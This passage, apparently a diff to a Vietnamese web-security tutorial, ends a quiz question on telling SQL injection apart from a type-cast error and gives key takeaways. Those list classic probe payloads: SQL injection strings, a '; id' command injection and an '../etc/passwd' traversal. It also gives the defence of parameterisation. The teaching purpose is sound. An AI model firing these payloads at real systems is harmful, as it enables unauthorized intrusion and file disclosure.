+    { q: 'Khi thử ?id=1\' trang báo HTTP 500, nhưng thử ?id=1\'\' trang vẫn HTTP 500 y hệt. Bạn nên nghi ngờ điều gì trước?', options: ['Chắc chắn có SQL injection, chạy sqlmap ngay', 'Có thể lỗi chuyển kiểu dữ liệu (ví dụ ép kiểu số nguyên) chứ chưa chắc là SQL injection', 'Trang đã bật WAF'], answer: 1, explain: 'Nếu là SQLi nối chuỗi, hai dấu nháy đơn thường đóng lại chuỗi hợp lệ hoặc đổi thông báo lỗi; lỗi y hệt thường do hàm ép kiểu (int) từ chối ký tự không phải số.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Cả họ lỗi injection (SQLi, command injection, XSS, LFI) chỉ có một gốc: dữ liệu người dùng bị máy chủ hiểu nhầm thành lệnh. Hiểu gốc thì không cần thuộc từng payload.
+- Thử mọi đầu vào chứ không chỉ ô đăng nhập. Payload kinh điển để bắt đầu: `' OR '1'='1`, `admin'-- -`, `; id`, `../../../../etc/passwd`.
+- Burp cho bạn thấy và sửa request thật. Khi tìm ra một lỗi, ghi lại trang, tham số, payload và tài khoản mà máy chủ chạy, vì đó là điểm xuất phát của bước leo thang.
+- Phòng thủ gốc là tách dữ liệu khỏi lệnh (tham số hoá) và kiểm tra ở máy chủ. Lọc từ khoá không bao giờ đủ.
